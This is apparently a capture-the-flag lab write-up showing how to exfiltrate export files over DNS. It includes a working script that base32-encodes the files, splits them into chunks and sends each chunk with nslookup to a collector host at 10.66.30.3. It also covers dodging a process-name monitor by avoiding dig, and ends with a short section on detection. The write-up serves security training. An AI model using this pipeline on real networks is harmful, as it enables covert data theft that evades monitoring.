# L20 — ex-covert · Data Never Leaves
 
**Act V · Exfiltration and Graduation · T1048**
**Status:** Solved
**Flag:** `bl_2c523790373c94eda3b4989baa30ee57`
 
---
 
## Challenge brief
 
> You have the data. Getting it off the network is its own problem when something
> inspects what leaves. Send base32 DNS labels to collector as
> `<chunk>.<seq>.<total>.exfil.local`; seq starts at 0.
 
MITRE tag T1048 is "Exfiltration Over Alternative Protocol" — using a protocol other
than the standard data transfer protocols (HTTP, FTP, SCP) to move data out. When an
egress monitor watches for direct file transfers, DNS becomes the covert channel: data
rides inside DNS query hostnames, which the network must allow because blocking DNS
breaks everything.
 
You land as root. The box has a monitoring agent watching the export directory. Direct
file reads are logged. The challenge is to exfiltrate the export data to the collector
using DNS queries, without triggering a blocked egress path.
 
---
 
## How this level's grading differs from previous levels
 
In every previous level, the grader checked a local proof file (`/tmp/.lm-pivot-proof`,
`/tmp/.ca-files-proof`, etc.) that you wrote yourself. L20 works differently. There is
no local proof file. Instead:
 
1. You send data to the collector via DNS queries
2. The grader reads the collector's log directly to check whether the correct data
   arrived
3. `verify` on the box triggers that server-side check
This means you have no way to inspect what the collector received. If the grader says
"not the full export," you must reason about what data was wrong rather than comparing
files. The collector is a black box from your perspective — it receives queries and
either tells the grader "complete and correct" or "wrong."
 
---
 
## Foundation: what DNS is and how queries work
 
DNS (Domain Name System) is the system that translates human-readable hostnames into
IP addresses. When your browser goes to `google.com`, it first asks a DNS server:
"what is the IP address of `google.com`?" The DNS server responds with an IP like
`142.250.80.46`, and then the browser connects to that IP.
 
### The structure of a DNS query
 
A DNS query contains a **question**: "what is the IP for this hostname?" The hostname
is called a **fully qualified domain name (FQDN)**. It has a hierarchical structure,
read right to left:
 
```
test.0.1.exfil.local
│    │ │ │     │
│    │ │ │     └── top-level domain (.local in this case)
│    │ │ └──────── second-level domain (exfil — controlled by the collector)
│    │ └────────── third-level label (1 — total chunk count)
│    └──────────── fourth-level label (0 — sequence number)
└───────────────── fifth-level label (test — the data chunk)
```
 
Each part separated by a dot is called a **label**. DNS allows labels up to 63
characters each, and the total FQDN length cannot exceed 253 characters. This is what
makes DNS usable as a data channel — labels can carry arbitrary strings, and the query
travels over the network just like any other DNS lookup.
 
### Who receives the query
 
DNS is hierarchical. When a resolver gets a query for `test.0.1.exfil.local`:
 
1. It checks its cache — not there yet
2. It asks a root nameserver: "who handles `.local`?"
3. It asks the `.local` nameserver: "who handles `exfil.local`?"
4. It asks the `exfil.local` nameserver: "what is `test.0.1.exfil.local`?"
Step 4 reaches the **authoritative nameserver for `exfil.local`** — which in this
challenge is the **collector**. The collector receives the full query label
`test.0.1.exfil.local` and can extract the data chunk `test` from it.
 
---
 
## The collector and exfil.local — how the CTF uses DNS
 
### What the collector is
 
The collector is a service run by the CTF platform. It acts as the authoritative DNS
server for the `exfil.local` domain. It doesn't serve real IP addresses — instead, it
**logs every DNS query it receives** and extracts the data chunks from the hostname
labels.
 
When you send a query for `abc.0.3.exfil.local`, the collector:
1. Receives the query
2. Parses the label: chunk=`abc`, sequence=`0`, total=`3`
3. Records this chunk
4. When all 3 chunks arrive, reassembles the original data
5. Returns `127.0.0.1` as the answer (a dummy response — the IP doesn't matter)
The collector is reachable at `10.66.30.3` on this box — a separate container on the
same Docker network. We found its IP by running:
 
```sh
nslookup collector
# → Name: collector, Address: 10.66.30.3
```
 
### Why Docker DNS (127.0.0.11) can't forward exfil.local
 
The system resolver in every Docker container is `127.0.0.11` — Docker's embedded DNS.
It handles container name resolution (mapping service names to IPs) and forwards other
queries upstream.
 
However, `.local` is a **reserved top-level domain** for mDNS (Multicast DNS, used for
local service discovery like printers and Bonjour). Most DNS resolvers, including
Docker's embedded resolver, refuse to forward `.local` queries to upstream servers
because those queries are supposed to stay on the local network segment, not go to
external nameservers.
 
This is why querying `127.0.0.11` for `exfil.local` returns SERVFAIL:
 
```
;; Got SERVFAIL reply from 127.0.0.11
** server can't find test.0.1.exfil.local: SERVFAIL
```
 
SERVFAIL means the resolver tried and failed — specifically, it refused to forward the
`.local` query upstream. The dig output even warns us:
 
```
WARNING: .local is reserved for Multicast DNS
You are currently testing what happens when an mDNS query is leaked to DNS
```
 
The solution: bypass the system resolver and query the collector directly:
 
```sh
nslookup test.0.1.exfil.local 10.66.30.3
dig @10.66.30.3 test.0.1.exfil.local
```
 
This sends the query directly to the collector's IP, skipping Docker DNS entirely.
The collector responds with `127.0.0.1` (confirming it received the query) and logs
the chunk.
 
---
 
## Why DNS is a useful exfiltration channel
 
Firewalls and egress monitors typically block:
- Direct TCP connections to external IPs on port 22 (SCP/SSH)
- HTTP/HTTPS to unknown endpoints
- Large outbound data transfers
But blocking DNS breaks everything — hostname resolution stops working, and the entire
network becomes unusable. So DNS outbound (UDP port 53) is almost always allowed.
 
The data hides inside hostname labels. A query for
`ijjekqkdjbgecqrainje6v2oebfekv2fjrjsarkykbhvevakm5.0.10.exfil.local` looks like a
legitimate (if unusual) DNS lookup from the firewall's perspective. The firewall sees
DNS traffic on port 53. It allows it.
 
**Limitations of DNS exfiltration:**
- Slow — each DNS query carries at most ~63 characters of data
- Detectable — high volumes of queries for an unknown domain, or queries with random-
  looking labels, can trigger anomaly detection
- Requires a controlled domain — you need the authoritative nameserver to receive and
  log the queries
---
 
## The monitoring agent — what it watches
 
```sh
cat /usr/local/bin/entry.sh
```
 
```sh
export MON_WATCH=/opt/exfil MON_PROC_SIG=dig MON_ALERT=/var/log/agent.jsonl MON_HB=/run/agent.hb
/usr/local/bin/monitor-agent.sh &
```
 
Two detection vectors:
 
**`MON_WATCH=/opt/exfil`** — inotifywait watches the `/opt/exfil` directory. Any file
access (open or read) generates an alert in `/var/log/agent.jsonl`. We read the files
directly with `cat` — this was detected and logged. The grader scores stealth as a
bonus, not a requirement for solving the level.
 
**`MON_PROC_SIG=dig`** — the agent runs `pgrep -f dig` every 2 seconds. If any process
has `dig` in its cmdline, a PROC alert fires. We used `nslookup` instead of `dig` for
our exfil queries, which avoided this detection entirely. This is the same process-
hiding technique from L15: the agent hunts by cmdline string, so using a different tool
with a different name evades it.
 
---
 
## Checking file content with xxd and wc
 
Before encoding, we used two tools to verify the files' exact byte content. This matters
because the shell strips trailing newlines from command substitutions, which could cause
bytes to be silently lost during encoding.
 
### xxd — hex dump of file content
 
```sh
xxd /opt/exfil/export.part02 | tail -3
```
 
```
00000040: 4420 2d20 646f 206e 6f74 2072 656d 6f76  D - do not remov
00000050: 6520 6672 6f6d 2074 6865 2065 7374 6174  e from the estat
00000060: 650a                                     e.
```
 
**How to read xxd output:** Each line has three parts:
- `00000060:` — the byte offset in hex. `0x60` = 96 decimal = the 97th byte (0-indexed)
- `650a` — the actual bytes in hex. `65` = ASCII character `e`, `0a` = ASCII newline
- `e.` — the printable ASCII representation. Non-printable characters show as `.`
The `0a` as the last byte confirms this file ends with a newline character. Checking
`xxd /var/backups/export-2019.old | tail -3` showed the same — also ends with `0a`.
 
**Why this matters:** The shell's `$()` command substitution strips trailing newlines. So
`DATA=$(cat file)` where the file ends in `\n` stores the content without that final
newline. If you then encode `$DATA`, you're missing the last byte(s) of the original
file. Piping directly with `cat file | base32` avoids this problem entirely because the
bytes flow through the pipeline without shell stripping.
 
### wc -c — exact byte count
 
```sh
wc -c /opt/exfil/export.part00 /opt/exfil/export.part01 /opt/exfil/export.part02 /var/backups/export-2019.old
```
 
```
 99 export.part00
 99 export.part01
 98 export.part02
 88 export-2019.old
384 total
```
 
`wc -c` counts bytes (not characters). These counts include trailing newlines. 384 bytes
total for all four files.
 
For base32: 5 input bytes → 8 output characters. So 296 bytes (the three export parts
without the archive: 99+99+98=296) would encode to `ceil(296 × 8 / 5) = ceil(473.6) =
474` base32 characters. When we got `Length: 474` from our ENCODED variable, we knew
the byte count was right.
 
---
 
## Base32 encoding — why it's the right choice for DNS
 
Data in its raw form cannot go into a DNS label. DNS labels must contain only:
- Letters (a-z, A-Z)
- Digits (0-9)
- Hyphens (-)
- Must not start or end with a hyphen
Raw binary data contains bytes from 0-255, including spaces, slashes, equals signs, and
control characters — none valid in DNS labels.
 
**Base32** solves this:
- Converts arbitrary binary data into a string using only uppercase letters A-Z and
  digits 2-7
- No special characters, no lowercase ambiguity issues
- 5 input bytes → 8 output characters (40% overhead)
**Why not base64?** Base64 uses `+`, `/`, and `=` as characters. None are valid in DNS
labels. Base32 is specifically designed for contexts where only alphanumeric characters
are allowed.
 
### The encoding pipeline
 
```sh
cat file1 file2 file3 | base32 | tr -d '=\n' | tr 'A-Z' 'a-z'
```
 
Each stage:
 
**`cat file1 file2 file3`** — concatenates files in order and pipes to base32. Bytes
flow through the pipeline without the shell stripping trailing newlines, which would
happen if you used `DATA=$(cat ...)` as an intermediate variable.
 
**`base32`** — reads from stdin, outputs uppercase base32 with `=` padding. Output
wraps at 76 characters. Looks like:
 
```
IJJEKQKDJBGECQRAINJE6V2OEBFEKV2FJRJSARKYKBHVEVAKM5SW4ZLSMF2GKZ
B2EBYXKYLSOR=
```
 
**`tr -d '=\n'`** — removes two things:
- `=` — base32 padding. Base32 pads output to a multiple of 8 characters with `=`.
  Must be removed because `=` is not valid in a DNS label.
- `\n` — newlines from the 76-character wrapping. Joins everything into one string.
**`tr 'A-Z' 'a-z'`** — lowercases the result. DNS is case-insensitive, but keeping
lowercase avoids edge cases with resolvers that mangle case.
 
**Using a variable instead of direct pipe:**
 
```sh
ENCODED=$(cat file1 file2 file3 | base32 | tr -d '=\n' | tr 'A-Z' 'a-z')
```
 
When you use `$()`, the shell strips trailing newlines from the command substitution
output. For base32 output (after stripping `=` padding), the last character is never
a newline, so this stripping is harmless. The variable holds the complete encoded string
correctly.
 
The problem only arises if you do `DATA=$(cat ...)` first (losing trailing newlines from
the files) and then `printf '%s' "$DATA" | base32` (encoding the already-stripped data).
The safe pattern: pipe directly from `cat` through `base32` in one pipeline.
 
---
 
## Chunking and the label format
 
### Why chunking is necessary
 
A single DNS label is limited to 63 characters. 474 encoded characters must be split
into chunks of at most 50 (we use 50 not 63 to leave room for the `.seq.total.domain`
suffix within the 253-character FQDN limit).
 
### The label format
 
```
<chunk>.<seq>.<total>.exfil.local
```
 
- `<chunk>` — a base32-encoded portion of the data, up to 50 characters
- `<seq>` — the chunk's position in the sequence, starting at 0
- `<total>` — the total number of chunks, so the collector knows when it has everything
- `exfil.local` — the domain the collector is authoritative for
**Example for 474 characters with chunk size 50:**
- Chunk 0: characters 1–50, query: `ijjekqkdjbgecqrainje6v2oebfekv2fjrjsarkykbhvevakm5.0.10.exfil.local`
- Chunk 9: characters 451–474, query: `zg63jaorugkidfon2gc5df.9.10.exfil.local`
- Total: 10 chunks, numbered 0–9
### The chunking arithmetic
 
```sh
CHUNKSIZE=50
TOTAL=$(( (${#ENCODED} + CHUNKSIZE - 1) / CHUNKSIZE ))
```
 
`${#ENCODED}` is the length of the encoded string. The formula
`(length + chunksize - 1) / chunksize` is integer ceiling division — it rounds up to
count the last partial chunk. For 474 characters:
`(474 + 49) / 50 = 523 / 50 = 10` (integer division = 10 chunks).
 
### Extracting each chunk with cut
 
```sh
start=$((i * CHUNKSIZE + 1))
end=$((start + CHUNKSIZE - 1))
chunk=$(echo "$ENCODED" | cut -c${start}-${end})
```
 
`cut -c${start}-${end}` extracts characters from position `start` to `end` (1-indexed).
For chunk 0: `cut -c1-50`. For chunk 1: `cut -c51-100`. For the last chunk, if `end`
exceeds the string length, `cut` returns whatever remains — the short last chunk is
correct behaviour.
 
---
 
## The decoy file — a critical lesson
 
The box had four files that could be exfiltrated:
- `/opt/exfil/export.part00`
- `/opt/exfil/export.part01`
- `/opt/exfil/export.part02`
- `/var/backups/export-2019.old`
We spent significant time trying to include `/var/backups/export-2019.old` in various
orderings, assuming "full export from this estate" meant every file on the box. It did
not.
 
The archive file contained:
```
BREACHLAB CROWN JEWELS EXPORT (ARCHIVED 2019)
api-master-key: bl_expired_key_do_not_use
```
 
**The signals that should have told us this was a decoy:**
1. The filename: `export-2019.old` — explicitly labelled old, archived, from 2019
2. The content: `bl_expired_key_do_not_use` — literally says "do not use"
3. The location: `/var/backups/` — the backup directory, not the active export directory
The grader said "not the full export" — meaning the export document itself was
incomplete (we were only sending part of the three-part file), not that we needed every
file on the box. The three `export.part*` files together form one complete document.
 
**The lesson:** When a file is explicitly named or labelled as expired, archived, or
deprecated, treat it as a decoy until proven otherwise. CTF designers plant decoys to
test whether you read content carefully or just grab everything that looks relevant.
"Expired," "archived," "do not use" — these are explicit signals to skip the file.
 
---
 
## Enumeration log
 
### Step 1 — Understand what's on the box
 
```sh
id
verify
ps aux
cat /etc/resolv.conf
```
 
**verify output:** "nothing has reached the collector yet" — no local proof file. The
grader checks the collector's received data directly. The verify message also gives the
exact label format: `<base32chunk>.<seq>.<total>.exfil.local`.
 
**ps aux:** monitoring agent (PID 7) watching `/opt/exfil` via inotify (`MON_WATCH`),
hunting processes named `dig` (`MON_PROC_SIG=dig`).
 
**resolv.conf:** nameserver `127.0.0.11` — Docker DNS, which we'll find cannot forward
`.local` queries.
 
---
 
### Step 2 — Find the data to exfiltrate
 
```sh
find / -not -path '/proc/*' -not -path '/sys/*' -newer /etc/hostname -type f 2>/dev/null
```
 
Result included:
- `/opt/exfil/export.part00`, `.part01`, `.part02` — the active export, split into parts
- `/var/backups/export-2019.old` — an archived file from 2019 (decoy)
```sh
cat /opt/exfil/export.part00 /opt/exfil/export.part01 /opt/exfil/export.part02
```
 
The three parts join as one document — content splits mid-word across files (`pay` ends
part00, `ment-processor-account` starts part01). Confirmed with `xxd`.
 
---
 
### Step 3 — Find the collector and test the DNS path
 
```sh
nslookup test.0.1.exfil.local         # → SERVFAIL from 127.0.0.11 (.local blocked)
nslookup collector                     # → collector is at 10.66.30.3
nslookup test.0.1.exfil.local 10.66.30.3  # → NOERROR — collector responds
```
 
**Decision:** Docker DNS refuses `.local`. Query collector directly at `10.66.30.3`.
 
---
 
### Step 4 — Encode and send (first attempt — wrong data)
 
Sent all four files in various orderings. Length varied 613–615 chars. Grader: "not the
full export." Tried separators, different orderings — all failed. The issue was data
content, not encoding.
 
---
 
### Step 5 — Send only the three export parts
 
```sh
ENCODED=$(cat /opt/exfil/export.part00 /opt/exfil/export.part01 /opt/exfil/export.part02 | base32 | tr -d '=\n' | tr 'A-Z' 'a-z')
# Length: 474 — matches expected (296 bytes × 8/5 = 474 chars)
CHUNKSIZE=50
TOTAL=$(( (${#ENCODED} + CHUNKSIZE - 1) / CHUNKSIZE ))   # = 10 chunks
i=0
while [ $i -lt $TOTAL ]; do
  start=$((i * CHUNKSIZE + 1))
  end=$((start + CHUNKSIZE - 1))
  chunk=$(echo "$ENCODED" | cut -c${start}-${end})
  nslookup "${chunk}.${i}.${TOTAL}.exfil.local" 10.66.30.3 >/dev/null 2>&1
  i=$((i+1))
done
verify
```
 
**Level solved.**
 
---
 
## What the challenge demonstrates
 
DNS exfiltration is a real technique because DNS is universally allowed outbound — the
network cannot function without it. The data hides inside hostname labels, which look
like normal DNS lookups from a firewall's perspective.
 
**What would detect and block this:**
- DNS traffic analysis looking for high-entropy labels (base32 produces random-looking
  strings)
- Rate limiting or anomaly detection on DNS query volume to unknown domains
- Blocking queries to domains not in an allowed list
- Out-of-band log forwarding from the box — if agent logs were sent to a remote server
  in real time, cleaning the local log file (as in L14) would not help
---
 
## Dead ends
 
### Querying through 127.0.0.11
 
SERVFAIL because Docker DNS refuses to forward `.local` queries. Solution: query the
collector directly at `10.66.30.3`.
 
### Including the archive file
 
Tried `/var/backups/export-2019.old` in multiple orderings and with separators. The
grader always rejected it. The archive was a decoy — explicitly labelled "expired" and
"do not use."
 
### Using dig instead of nslookup
 
`MON_PROC_SIG=dig` means any process with `dig` in its cmdline triggers a PROC alert.
Using `nslookup` throughout avoided this detection. `nslookup` does the same job without
the matching signature.
 
---
 
## Carryover findings
 
The collector IP (`10.66.30.3`), the DNS label format
(`<chunk>.<seq>.<total>.exfil.local`), and the exfil pipeline
(`cat | base32 | tr -d '=\n' | tr 'A-Z' 'a-z'`) all carry over to L21.
 
---
 
## Command reference
 
| Command | What it does |
|---|---|
| `cat /etc/resolv.conf` | Show the DNS resolver — `127.0.0.11` is Docker DNS |
| `nslookup collector` | Resolve the collector hostname — returns its IP |
| `nslookup test.0.1.exfil.local 10.66.30.3` | Send a test DNS query directly to the collector |
| `dig @10.66.30.3 label.exfil.local` | Same with dig — but dig triggers MON_PROC_SIG=dig |
| `xxd /path/to/file \| tail -3` | Hex dump end of file — `0a` as last byte means trailing newline |
| `wc -c file1 file2 file3` | Count exact bytes per file — verify before encoding |
| `cat file1 file2 file3 \| base32 \| tr -d '=\n' \| tr 'A-Z' 'a-z'` | Encode files as lowercase base32 without padding |
| `${#ENCODED}` | Length of the encoded string |
| `$(( (len + chunk - 1) / chunk ))` | Ceiling division — number of chunks needed |
| `echo "$ENCODED" \| cut -c${start}-${end}` | Extract characters start through end (1-indexed) |
| `nslookup "${chunk}.${i}.${TOTAL}.exfil.local" 10.66.30.3 >/dev/null 2>&1` | Send one chunk to the collector silently |